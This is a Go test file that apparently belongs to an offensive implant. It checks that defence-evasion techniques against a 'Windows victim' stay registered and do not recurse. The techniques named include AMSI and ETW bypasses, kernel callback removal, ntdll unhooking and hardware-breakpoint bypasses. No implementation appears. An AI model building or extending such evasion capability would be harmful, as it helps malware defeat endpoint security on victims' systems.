//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"strings"
	"testing"
	"time"
)

// TestEvasionKernelTechniquesDoNotRecurse guards against the batch-4 stack-overflow
// regression: task_evasion.go's init() used to re-register the five kernel-level
// evasion techniques with wrap(handleEvasion*) on every platform. Because those
// handlers dispatch through runEvasion(name), the overwritten registry entry
// pointed at itself -> infinite recursion on a Windows victim. The real
// implementations (evasion_*_windows.go) must never be shadowed, and invoking
// the technique must always terminate.
func TestEvasionKernelTechniquesDoNotRecurse(t *testing.T) {
	names := []string{"kernel_callback", "etwti", "enum_callbacks", "objcb", "imgload"}
	for _, n := range names {
		t.Run(n, func(t *testing.T) {
			done := make(chan string, 1)
			go func() {
				done <- runEvasion(n)
			}()
			select {
			case out := <-done:
				if out == "" {
					t.Fatalf("runEvasion(%s) returned empty output", n)
				}
				if strings.Contains(out, "error:") {
					t.Logf("runEvasion(%s) -> %s", n, out)
				}
			case <-time.After(3 * time.Second):
				t.Fatalf("runEvasion(%s) did not return: recursion regression", n)
			}
		})
	}
}

// TestEvasionRegistryHasAllTechniques ensures the seven non-kernel techniques
// remain registered after the kernel re-registration split (they are only wired
// in task_evasion.go init, unlike the kernel ones).
func TestEvasionRegistryHasAllTechniques(t *testing.T) {
	got := map[string]bool{}
	for _, n := range listEvasionTechniques() {
		got[n] = true
	}
	for _, n := range []string{"amsi", "etw", "etw_ntrace", "amsi_session", "blockdlls", "unhook_ntdll", "protect_process", "amsi_hardware_bp", "etw_hardware_bp"} {
		if !got[n] {
			t.Errorf("technique %q missing from registry", n)
		}
	}
}